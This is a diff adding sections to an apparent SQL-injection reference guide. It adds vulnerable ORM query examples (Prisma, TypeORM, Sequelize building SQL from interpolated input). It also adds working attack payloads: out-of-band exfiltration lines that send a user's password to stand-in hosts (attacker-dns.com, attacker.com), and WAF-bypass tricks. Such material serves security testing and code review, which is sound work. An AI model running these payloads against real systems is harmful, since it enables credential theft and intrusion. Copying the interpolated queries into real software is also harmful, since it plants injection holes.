@@ -46,6 +46,18 @@ string query = "SELECT * FROM Products WHERE Name = '" + input + "'";
 SqlCommand cmd = new SqlCommand(query, conn);
 ```
 
+### Modern ORM / Query Builder Edge Cases
+```typescript
+// [NEW] Prisma - $queryRawUnsafe is a direct injection point
+const result = await prisma.$queryRawUnsafe(`SELECT * FROM User WHERE id = ${id}`);
+
+// [NEW] TypeORM - .query() without parameterization
+const users = await userRepository.query(`SELECT * FROM users WHERE name = '${name}'`);
+
+// [NEW] Sequelize - raw: true sometimes leads developers to skip parameterization
+const users = await User.findAll({ where: `id = ${id}`, raw: true });
+```
+
 ---
 
 ## 🔍 `grep_search` Tactics
@@ -113,6 +125,28 @@ admin'--
 ### Error-Based SQLi
 ```sql
 ' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version())))--
+```
+
+### Out-of-Bound (OOB) Exfiltration
+*Used when the response is blind and time-based is too slow or blocked.*
+```sql
+-- MySQL / MariaDB (requires secure_file_priv to be empty)
+' AND (SELECT 1 FROM (SELECT(LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users WHERE id=1),'.attacker-dns.com\\a'))))x)--
+
+-- MSSQL (xp_dirtree exfiltration)
+'; DECLARE @p VARCHAR(1024); SET @p = (SELECT password FROM users WHERE id=1) + '.attacker.com'; EXEC master..xp_dirtree @p--
+```
+
+### Advanced WAF Bypasses
+```sql
+-- Nested comments to confuse parser regex
+/*!13337SELECT*/ * FROM users WHERE id=1
+
+-- Char() encoding for blocked keywords
+' OR 1=1 UNION SELECT char(45,120,45)
+
+-- Newline smashing
+%0AUNION%0ASELECT%0A1,2,3--
 ```
 
 ---
